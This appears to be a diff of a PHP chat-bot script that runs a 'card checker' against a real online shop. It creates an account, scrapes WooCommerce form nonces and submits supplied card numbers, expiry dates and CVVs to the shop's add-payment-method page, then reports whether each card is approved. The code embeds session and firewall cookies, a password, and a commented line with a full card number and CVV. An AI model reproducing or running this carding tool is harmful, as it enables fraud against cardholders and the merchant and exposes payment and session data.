@@ -474,7 +474,7 @@ fclose($fp);
 
 if (strpos($message, ".ze") === 0 || strpos($message, "!ze") === 0 || strpos($message, "/ze") === 0) {
 
-	sendPv($myid, 'error2..');
+	sendPv($myid, 'error3..');
 
 
 $lista = substr($message, 4);
@@ -1579,28 +1579,33 @@ curl_close($ch);
 
 
 
-$headers = array();
-$headers[] = "Host:www.warfighterhemp.com";
-$headers[] = "cache-control: max-age=0";
-$headers[] = "upgrade-insecure-requests: 1";
-$headers[] = "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36";
-$headers[] = "referer: https://www.warfighterhemp.com/my-account/add-payment-method/";
-$headers[] = "cookie: PHPSESSID=212fbc15f71bcc4c6523856b55168a5d";
-$headers[] = "cookie: sbjs_migrations=1418474375998%3D1";
-$headers[] = "cookie: sbjs_current_add=fd%3D2024-09-01%2002%3A33%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29";
-$headers[] = "cookie: sbjs_first_add=fd%3D2024-09-01%2002%3A33%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29";
-$headers[] = "cookie: sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29";
-$headers[] = "cookie: sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29";
-$headers[] = "cookie: sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36";
-$headers[] = "cookie: lepopup-onload-WFH-Age-Verification=ilovefamily";
-$headers[] = "cookie: undefined=hidden";
-$headers[] = "cookie: wordpress_logged_in_e1799a98d401098f9b47d4c3f78c6c00=gopejob932%7C1726371315%7CxKjbMc5CqommL6NpUYvaxW2XinH9aH8T3oBhkO0VEn2%7Cfc6213f501ed59e619311b5374589b256f79c09b60acbe170c0bddd8f2468dcc";
-$headers[] = "cookie: wfwaf-authcookie-a566fef2ac3836d146bc189f6ed40f0e=5553%7Cother%7Cread%7Cbbb2aaec203845433e4024dc542fe29c176ed4fe9b73c69eee1a8d24edce7b3c";
-$headers[] = "cookie: sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F";
 
 
+//////////SACA EL NONCE1///////
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, "https://www.warfighterhemp.com/my-account/add-payment-method/");
+curl_setopt($ch, CURLOPT_URL, 'https://www.warfighterhemp.com/create-account/');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36');
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_HTTPGET, 1);
+curl_setopt($ch, CURLOPT_COOKIE, 'lepopup-onload-WFH-Age-Verification=ilovefamily; PHPSESSID=a03d0013a3591de6545331ade3c7dd0d; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-02%2018%3A07%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-02%2018%3A07%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; _ga=GA1.1.1520763890.1725300459; undefined=hidden; __kla_id=eyJjaWQiOiJZV0UzWWpnek5qSXRPVEk1TlMwMFlUY3dMV0V3WTJNdE5ERmtOamN6TmpjM05XWTIiLCIkcmVmZXJyZXIiOnsidHMiOjE3MjUzMDA0NjAsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LndhcmZpZ2h0ZXJoZW1wLmNvbS9teS1hY2NvdW50L2FkZC1wYXltZW50LW1ldGhvZC8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE3MjUzMDA1MDgsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LndhcmZpZ2h0ZXJoZW1wLmNvbS9teS1hY2NvdW50L2FkZC1wYXltZW50LW1ldGhvZC8ifSwiJGV4Y2hhbmdlX2lkIjoiWXBJanBIQ2ZOSnRQajZJclFJTC1ndGVjNFdRQnNUZjNLQTRFeE1PWUhVSS5TaWttZ1AifQ==; wordpress_test_cookie=WP%20Cookie%20check; _ga_TD2GLRCPH9=GS1.1.1725300459.1.1.1725300532.0.0.0; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fcreate-account%2F');
+$response = curl_exec($ch);
+$err = curl_error($ch);
+curl_close($ch);
+
+$nonce1 = '';
+if(preg_match('/<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="([^"]+)"/', $response, $matches)) {
+    $nonce1 = $matches[1];
+}
+
+//echo "nonce1: $nonce1\n";
+
+//////////SE REGISTRA///////
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://www.warfighterhemp.com/create-account/');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36');
@@ -1608,21 +1613,60 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=nmi_gateway_woocommerce_credit_card&wc-nmi-gateway-woocommerce-credit-card-account-number='.$cc.'&wc-nmi-gateway-woocommerce-credit-card-expiry='.$mes.'+%2F+'.$ano.'&wc-nmi-gateway-woocommerce-credit-card-csc='.$cvv.'&woocommerce-add-payment-method-nonce=9c4b4d45c8&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1');
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$correo.'&password=riggo43%4024&srp_birthday_date=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F&wc_order_attribution_session_start_time='.date('Y-m-d') . '+' . urlencode(date('H:i:s')).'&wc_order_attribution_session_pages=7&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F128.0.0.0+Mobile+Safari%2F537.36&woocommerce-register-nonce='.$nonce1.'&_wp_http_referer=%2Fcreate-account%2F&register=Register');
+curl_setopt($ch, CURLOPT_COOKIE, 'lepopup-onload-WFH-Age-Verification=ilovefamily; PHPSESSID=a03d0013a3591de6545331ade3c7dd0d; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-02%2018%3A07%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-02%2018%3A07%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; _ga=GA1.1.1520763890.1725300459; undefined=hidden; __kla_id=eyJjaWQiOiJZV0UzWWpnek5qSXRPVEk1TlMwMFlUY3dMV0V3WTJNdE5ERmtOamN6TmpjM05XWTIiLCIkcmVmZXJyZXIiOnsidHMiOjE3MjUzMDA0NjAsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LndhcmZpZ2h0ZXJoZW1wLmNvbS9teS1hY2NvdW50L2FkZC1wYXltZW50LW1ldGhvZC8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE3MjUzMDA1MDgsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LndhcmZpZ2h0ZXJoZW1wLmNvbS9teS1hY2NvdW50L2FkZC1wYXltZW50LW1ldGhvZC8ifSwiJGV4Y2hhbmdlX2lkIjoiWXBJanBIQ2ZOSnRQajZJclFJTC1ndGVjNFdRQnNUZjNLQTRFeE1PWUhVSS5TaWttZ1AifQ==; wordpress_test_cookie=WP%20Cookie%20check; _ga_TD2GLRCPH9=GS1.1.1725300459.1.1.1725300532.0.0.0; wordpress_logged_in_e1799a98d401098f9b47d4c3f78c6c00=gopejob2%7C1726513869%7CiywUH3lGWDPIRKu8Gg0u4UdCZIQK9yRar4hOiYRxh5h%7Cdfcb48e0a723763752163403bc344ad7437f8da2e01dc4de56035f74c582c15e; wfwaf-authcookie-a566fef2ac3836d146bc189f6ed40f0e=5561%7Cother%7Cread%7Cb6b1bbd1d2cecef82c5c0fb5fb8e80747f52ff3f3b0260e0657130f387c9c730; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F');
 $response = curl_exec($ch);
+$err = curl_error($ch);
+curl_close($ch);
+
+
+
+
+//////////SACA EL NONCE2///////
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://www.warfighterhemp.com/my-account/add-payment-method/');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36');
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_HTTPGET, 1);
+curl_setopt($ch, CURLOPT_COOKIE, 'lepopup-onload-WFH-Age-Verification=ilovefamily; PHPSESSID=a03d0013a3591de6545331ade3c7dd0d; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-02%2018%3A07%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-02%2018%3A07%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; _ga=GA1.1.1520763890.1725300459; undefined=hidden; __kla_id=eyJjaWQiOiJZV0UzWWpnek5qSXRPVEk1TlMwMFlUY3dMV0V3WTJNdE5ERmtOamN6TmpjM05XWTIiLCIkcmVmZXJyZXIiOnsidHMiOjE3MjUzMDA0NjAsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LndhcmZpZ2h0ZXJoZW1wLmNvbS9teS1hY2NvdW50L2FkZC1wYXltZW50LW1ldGhvZC8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE3MjUzMDA1MDgsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LndhcmZpZ2h0ZXJoZW1wLmNvbS9teS1hY2NvdW50L2FkZC1wYXltZW50LW1ldGhvZC8ifSwiJGV4Y2hhbmdlX2lkIjoiWXBJanBIQ2ZOSnRQajZJclFJTC1ndGVjNFdRQnNUZjNLQTRFeE1PWUhVSS5TaWttZ1AifQ==; wordpress_test_cookie=WP%20Cookie%20check; _ga_TD2GLRCPH9=GS1.1.1725300459.1.1.1725300532.0.0.0; wordpress_logged_in_e1799a98d401098f9b47d4c3f78c6c00=gopejob2%7C1726513869%7CiywUH3lGWDPIRKu8Gg0u4UdCZIQK9yRar4hOiYRxh5h%7Cdfcb48e0a723763752163403bc344ad7437f8da2e01dc4de56035f74c582c15e; wfwaf-authcookie-a566fef2ac3836d146bc189f6ed40f0e=5561%7Cother%7Cread%7Cb6b1bbd1d2cecef82c5c0fb5fb8e80747f52ff3f3b0260e0657130f387c9c730; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fpayment-methods%2F');
+$response = curl_exec($ch);
+$err = curl_error($ch);
+curl_close($ch);
+
+preg_match('/<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="(.*?)" \/>/', $response, $matches);
+$nonce2 = $matches[1] ?? null;
+
+
+//echo "nonce2 $nonce2\n";
+
+//////////VERIFICA LA CARD///////
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://www.warfighterhemp.com/my-account/add-payment-method/');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36');
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+//curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_HTTPGET, 1);
+//curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=nmi_gateway_woocommerce_credit_card&wc-nmi-gateway-woocommerce-credit-card-account-number='.$cc.'&wc-nmi-gateway-woocommerce-credit-card-expiry='.$mes.'+%2F+'.$ano.'&wc-nmi-gateway-woocommerce-credit-card-csc='.$cvv.'&woocommerce-add-payment-method-nonce='.$nonce2.'&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=nmi_gateway_woocommerce_credit_card&wc-nmi-gateway-woocommerce-credit-card-account-number='.$cc.'&wc-nmi-gateway-woocommerce-credit-card-expiry='.$mes.'+%2F+'.$ano.'&wc-nmi-gateway-woocommerce-credit-card-csc='.$cvv.'&woocommerce-add-payment-method-nonce='.$nonce2.'&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1');
+//'payment_method=nmi_gateway_woocommerce_credit_card&wc-nmi-gateway-woocommerce-credit-card-account-number=5355+8422+7977+3621&wc-nmi-gateway-woocommerce-credit-card-expiry=10+%2F+27&wc-nmi-gateway-woocommerce-credit-card-csc=237&woocommerce-add-payment-method-nonce=6368d5de14&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1');
+curl_setopt($ch, CURLOPT_COOKIE, 'lepopup-onload-WFH-Age-Verification=ilovefamily; PHPSESSID=a03d0013a3591de6545331ade3c7dd0d; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-02%2018%3A07%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-02%2018%3A07%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; _ga=GA1.1.1520763890.1725300459; undefined=hidden; __kla_id=eyJjaWQiOiJZV0UzWWpnek5qSXRPVEk1TlMwMFlUY3dMV0V3WTJNdE5ERmtOamN6TmpjM05XWTIiLCIkcmVmZXJyZXIiOnsidHMiOjE3MjUzMDA0NjAsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LndhcmZpZ2h0ZXJoZW1wLmNvbS9teS1hY2NvdW50L2FkZC1wYXltZW50LW1ldGhvZC8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE3MjUzMDA1MDgsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LndhcmZpZ2h0ZXJoZW1wLmNvbS9teS1hY2NvdW50L2FkZC1wYXltZW50LW1ldGhvZC8ifSwiJGV4Y2hhbmdlX2lkIjoiWXBJanBIQ2ZOSnRQajZJclFJTC1ndGVjNFdRQnNUZjNLQTRFeE1PWUhVSS5TaWttZ1AifQ==; wordpress_test_cookie=WP%20Cookie%20check; _ga_TD2GLRCPH9=GS1.1.1725300459.1.1.1725300532.0.0.0; wordpress_logged_in_e1799a98d401098f9b47d4c3f78c6c00=gopejob2%7C1726513869%7CiywUH3lGWDPIRKu8Gg0u4UdCZIQK9yRar4hOiYRxh5h%7Cdfcb48e0a723763752163403bc344ad7437f8da2e01dc4de56035f74c582c15e; wfwaf-authcookie-a566fef2ac3836d146bc189f6ed40f0e=5561%7Cother%7Cread%7Cb6b1bbd1d2cecef82c5c0fb5fb8e80747f52ff3f3b0260e0657130f387c9c730; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F');
+$response = curl_exec($ch);
+$err = curl_error($ch);
+curl_close($ch);
 
 $result1 = (strpos($response, "Nice! New payment method added") !== false) ? "Approved" : trim(strip_tags(capture($response, '<ul class="woocommerce-error" role="alert">', '</ul>'))) ?? "An error occurred, please try again";
-
 $patron = "/failed: (.*)/";
 preg_match($patron, $result1, $matches);
 $respo = $matches[1];
 	
-sendPv($myid, $result1);
-curl_close($ch);
-
-
 	
 $timetakeen = (microtime(true) - $startTime);
 $time = substr_replace($timetakeen, '',4);
